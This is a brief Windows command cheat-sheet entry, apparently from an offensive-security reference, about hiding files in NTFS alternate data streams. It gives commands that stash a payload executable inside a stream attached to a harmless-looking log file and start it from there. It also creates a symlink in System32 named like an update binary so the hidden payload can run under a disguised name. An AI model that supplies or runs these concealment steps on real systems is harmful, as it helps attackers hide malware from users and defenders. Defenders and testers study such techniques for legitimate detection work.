---
title: Hiding Files via Alternate Data Streams
category: privesc
subcategory: windows-misc
os: windows
command: type payload.exe > windowslog.txt:winpeas.exe
tools: type, mklink
---


### Stash an executable inside an ADS

```cmd
type payload.exe > windowslog.txt:winpeas.exe
start windowslog.txt:winpeas.exe
```

### Symlink trick to launch from System32

```cmd
cd C:\Windows\System32
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
wupdate
```
